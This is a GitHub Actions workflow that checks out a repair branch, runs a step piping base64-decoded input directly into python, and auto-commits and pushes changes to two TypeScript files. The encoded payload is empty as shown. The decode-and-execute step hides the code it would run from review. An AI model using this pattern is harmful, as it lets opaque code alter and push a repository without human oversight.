name: Issue 7 transaction green slice

on:
  push:
    branches:
      - sdd/issue-6-verifier

permissions:
  contents: write

jobs:
  apply:
    runs-on: ubuntu-latest
    steps:
      - name: Checkout repair branch
        uses: actions/checkout@v4
        with:
          ref: sdd/issue-7-repair
          fetch-depth: 0
      - name: Apply atomic store transaction
        shell: bash
        run: |
          printf '%s' '' | base64 -d | python
      - name: Commit green slice
        shell: bash
        run: |
          git config user.name "Issue 7 verifier"
          git config user.email "41898282+github-actions[bot]@users.noreply.github.com"
          git add src/engine/types/index.ts src/engine/SimulationEngine.ts
          git diff --cached --check
          git commit -m "feat: make store purchases atomic"
          git push origin HEAD:sdd/issue-7-repair
